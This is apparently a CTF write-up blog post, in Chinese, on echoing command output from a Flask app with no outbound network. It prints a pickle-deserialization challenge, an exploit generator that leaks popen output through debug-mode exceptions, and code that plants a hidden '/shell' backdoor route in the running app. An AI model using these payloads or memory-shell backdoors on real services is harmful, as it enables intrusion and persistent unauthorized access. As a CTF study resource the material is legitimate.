---
title: flask不出网回显方式
tags:
  - python
  - flask
---

# flask不出网回显方式
## 前言
研究这个问题主要是打比赛的时候遇到了，题目内容大概是这样的
```python
# app.py
from flask import Flask, request, session, render_template_string, url_for, redirect
import pickle
import io
import sys
import base64
import random
import subprocess
from config import notadmin

app = Flask(__name__)


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in ['config'] and "__" not in name:
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError("'%s.%s' not allowed" % (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


@app.route('/')
def index():
    info = request.args.get('name', '')
    if info is not '':
        x = base64.b64decode(info)
        User = restricted_loads(x)
    return render_template_string('Hello')



if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True, port=5000)
```
```python
# config.py
notadmin = {"admin": "no"}


def backdoor(cmd):
    if notadmin["admin"] == "yes":
        s = ''.join(cmd)
        eval(s)

```
可以看出来是个简单的pickle反序列化，这不是本次的重点，重点是这道题在eval后如何回显，最简单的方式想到的是反弹shell，但是经过测试发现目标机器并不出网，所以我们需要寻找其他的方式去让我们的命令回显

## debug模式下利用报错
众所周知，在flask中如果开启了debug模式，报错是会显示详细信息的，比赛中debug模式通常考点是构造pin码，但是我们这里想到，可以通过手动控制报错的方式来让我们的命令回显。

简单地构造exp，这里需要注意的是eval并不能执行python语句，所以我们需要利用eval去调用exec来实现手动抛出报错
```python
from base64 import b64encode
from urllib.parse import quote


def base64_encode(s: str, encoding='utf-8') -> str:
    return b64encode(s.encode()).decode(encoding=encoding)


exc = "raise Exception(__import__('os').popen('whoami').read())"
exc = base64_encode(exc).encode()

opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (exc)

print(quote(b64encode(opcode).decode()))
```

![](https://gitee.com/guuest/images/raw/master/img/20211024113458.png)

可以看到我们成功通过Exception去拿到了回显

## 非debug模式下利用内存马
这里了参考文章: [iceyhexman/flask_memory_shell](https://github.com/iceyhexman/flask_memory_shell)
这篇文章是ssti下如何利用flask去添加一个后门路由，我们可以参考他的想法来尝试获取app添加后门路由，这里一个难点是如何拿到正在运行的app

### 失败的尝试: 直接import模块获取app
一开始想到的方法是直接`import app.py`来获取app，但是事实证明此app非彼app，添加了路由但是并不能访问到，应该是一个全新的app
### 成功的尝试: sys.modules
> sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。

所以我们可以通过sys.modules拿到当前已经导入的模块，并且获取模块中的属性，由于我们最终的eval是在app.py中执行的，所以我们可以通过`sys.modules['__main__']`来获取当前的模块，我们写个简单的测试来看看上面的app与实际的app是否相同
```python
import sys
import app
app1 = sys.modules['__main__'].__dict__['app']
app2 = app.app
print(id(app1))
print(id(app2))
```

![](https://gitee.com/guuest/images/raw/master/img/20211024114600.png)

可以看到app的id并不相同，所以他们并非相同的app

这里我们尝试直接添加后门路由，会发现存在报错
```python
import sys
import os
sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :os.popen('dir').read())
```

![](https://gitee.com/guuest/images/raw/master/img/20211024114744.png)

这个报错是由于我们在第一个请求处理后调用了设置函数(add_url_rule)，此报错只会在debug模式下触发，可以参考使用了Flask框架的工具的issue:
- https://github.com/alexmclarty/mirror/issues/6
- https://github.com/pallets/flask/issues/2616

所以我们需要在非debug模式下才能成功添加后门路由(又或者我们直接设置debug=False来解决这个问题)
```python
import sys
sys.modules['__main__'].__dict__['app'].debug=False
sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :__import__('os').popen('dir').read())
```

![](https://gitee.com/guuest/images/raw/master/img/20211024115906.png)